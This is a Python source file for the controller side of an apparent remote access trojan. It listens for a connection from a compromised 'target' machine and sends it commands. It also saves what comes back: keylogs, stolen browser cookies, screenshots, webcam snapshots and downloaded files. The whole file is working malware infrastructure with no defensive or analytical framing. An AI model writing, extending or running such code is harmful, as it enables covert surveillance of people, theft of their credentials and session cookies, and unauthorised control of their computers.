import socket
import base64
import simplejson
import os
import argparse
import time
import datetime


class Server:
    def __init__(self, host, port):
        self.socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.socket_connection.bind((host, port))
            self.socket_connection.listen(0)
        except OSError:
            print("Error! Wrong ip or port number")
            exit()
        try:
            print("Server started. Listening for incoming connections\n")
            self.connection, self.connection_address = self.socket_connection.accept()
        except KeyboardInterrupt:
            print("Keyboard Interrupt Detected!")
            exit()
        print("Connection Established: " + str(self.connection_address) + "\n")

    def get_help_menu(self):
        with open("menu/menu.txt", "r") as menu:
            return menu.read()

    def send_json(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def get_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1048576).decode("utf-8")
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def send_command(self, command):
        if command[0] == "exit":
            self.connection.close()
            print("Closing connections before exiting...")
            exit()
        elif command[0] == "clear":
            os.system("clear")
        elif command[0] == "help":
            print(self.get_help_menu())
        else:
            self.send_json(command)
            return self.get_json()

    def get_file(self, file_name):
        with open(file_name, "rb") as file:
            return base64.b64encode(file.read())

    def save_file(self, file_name, file_content):
        with open(file_name, "wb") as file:
            file.write(base64.b64decode(file_content))
            if self.command_input[0] == "save_keys":
                return "Targets keylog saved!"
            elif self.command_input[0] == "get_browser_cookies":
                return "Targets browser cookies saved!"
            elif self.command_input[0] == "get_screen":
                return "Targets screenshot saved!"
            elif self.command_input[0] == "get_camera":
                return "Target snapshot saved!"
            else:
                return "Target files downloaded!"

    def get_file_datetime(self):
        date = datetime.datetime.now()
        file_date = str(date.hour) + ":" + str(date.minute) + ":" + str(date.second) + " "
        return file_date

    def server_main(self):
        print(self.get_help_menu())
        while True:
            self.command_input = input("Enter Command: ")
            self.command_input = self.command_input.split(" ")
            try:
                if self.command_input[0] == "send_file":
                    file_content = self.get_file(self.command_input[1])
                    self.command_input.append(file_content)

                command_output = self.send_command(self.command_input)

                if self.command_input[0] == "get_file":
                    command_output = self.save_file(self.command_input[1], command_output)
                elif self.command_input[0] == "save_keys":
                    command_output = self.save_file(self.get_file_datetime() + "target_keylog.txt", command_output)
                elif self.command_input[0] == "get_browser_cookies":
                    command_output = self.save_file(self.get_file_datetime() + "target_cookie.txt", command_output)
                elif self.command_input[0] == "get_screen":
                    command_output = self.save_file(self.get_file_datetime() + "target_screen.png", command_output)
                elif self.command_input[0] == "get_camera":
                    command_output = self.save_file(self.get_file_datetime() + "target_camera_snapshot.png", command_output)
                print(command_output)

            except Exception:
                print("Command not sent. Please check connection...")


ap = argparse.ArgumentParser()
ap.add_argument("-ip", "--ip_address", required=True, help="Enter the IP address to listen.")
ap.add_argument("-p", "--port", required=True, help="Enter the port number to listen.")
args = vars(ap.parse_args())

server = Server(args["ip_address"], int(args["port"]))
server.server_main()
